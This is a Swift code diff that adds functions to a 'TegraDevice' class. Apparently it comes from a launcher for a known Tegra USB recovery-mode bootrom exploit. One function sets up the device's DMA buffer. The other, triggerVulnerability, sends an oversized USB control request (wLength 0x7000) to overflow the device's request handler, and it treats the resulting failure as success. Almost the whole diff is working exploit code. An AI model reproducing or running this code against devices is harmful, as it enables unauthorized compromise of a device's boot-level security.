@@ -100,4 +100,50 @@ public class TegraDevice {
         
         return (true, cycles)
     }
+    
+    static func switchToHigherBuffer () -> Bool {
+        let buffer: [UInt8] = [UInt8](repeating: 0, count: 0x1000)
+        
+        let r: Bool = USBDevice.write(
+            endpointPipeRef: writePipeRef,
+            bufferToWrite: buffer
+        )
+        if (!r) {
+            print("TegraDevice: Failed switching to higher buffer.")
+            return false
+        }
+        
+        return true
+    }
+    
+    static func triggerVulnerability () -> Bool {
+        var kr: Int32 = 0
+        
+        if (USBBackend.tegraDeviceInterface == nil) {
+            print("TegraDevice: USBBackend didn't acquire the Device Interface yet...")
+            return false
+        }
+        var buffer: [UInt8] = [UInt8](repeating: 0, count: 0x7000)
+        var vulnerableRequest: IOUSBDevRequestTO = IOUSBDevRequestTO(
+            bmRequestType: 0x82,
+            bRequest: 0x00,
+            wValue: 0,
+            wIndex: 0,
+            wLength: 0x7000,
+            pData: &buffer,
+            wLenDone: 0,
+            noDataTimeout: 100,
+            completionTimeout: 100
+        )
+        kr = USBBackend.tegraDeviceInterface!.DeviceRequestTO(
+            USBBackend.tegraDeviceInterfacePtrPtr,
+            &vulnerableRequest
+        )
+        if (!KernelSucceeded(kernelReturn: kr)) {
+            print("TegraDevice: Failed DeviceRequest. It is a victory then :)")
+            return true
+        }
+        
+        return true
+    }
 }
